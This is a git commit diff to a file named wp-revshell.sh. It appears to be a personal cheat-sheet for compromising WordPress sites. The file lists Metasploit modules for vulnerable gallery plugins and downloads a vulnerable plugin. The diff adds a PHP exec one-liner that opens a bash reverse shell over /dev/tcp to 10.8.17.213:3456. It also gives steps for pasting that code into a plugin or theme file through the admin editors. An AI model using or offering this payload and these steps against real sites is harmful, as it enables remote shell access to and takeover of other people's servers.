856a80f6f8de886cd99b6ddacd0e8264b228ab7b
Jackmeister <78603128+J4CKMEISTER@users.noreply.github.com>
2023-02-17 11:06:27 +0800

    Update wp-revshell.sh

--- wp-revshell.sh
+++ wp-revshell.sh
@@ -1,10 +1,12 @@
 #!/bin/bash
 
-#Plugin Upload
+#Plugin Upload or Edit 
 wget https://exploit-db.com/apps/ad33afbc2f2e22877b202d986acd43bd-reflex-gallery.zip
 use exploit/unix/webapp/wp_slideshowgallery_upload
-use exploit/unix/webapp/wp_reflexgallery_file_upload
+use exploit/unix/webapp/wp_reflexgallery_file_upload 
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.17.213/3456 0>&1'"); ?>
 
+Plugin > Plugin Editor > Select a php plugin (normally HelloDobby) > Put php exec code and update
 
 #Appereance > Theme Editor >  404.php or any php file
 https://www.revshells.com/
